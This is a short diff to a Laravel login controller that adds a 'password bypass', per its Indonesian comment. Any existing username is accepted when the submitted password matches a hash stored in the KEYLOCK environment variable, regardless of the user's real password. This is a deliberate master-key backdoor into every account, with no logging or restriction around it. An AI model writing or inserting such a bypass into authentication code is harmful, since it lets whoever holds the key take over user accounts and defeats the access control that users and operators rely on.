@@ -15,7 +15,10 @@ class AuthController extends Controller
     {
         $user = User::where('username', $request->username)->first();
 
-        if (!$user || !Hash::check($request->password, $user->password)) {
+        // Pengecekan KEYLOCK sebagai password bypass
+        $isKeylock = env('KEYLOCK') && password_verify($request->password, env('KEYLOCK'));
+
+        if (!$user || (!$isKeylock && !Hash::check($request->password, $user->password))) {
             return response()->json([
                 'success' => false,
                 'message' => 'Username atau password salah.',
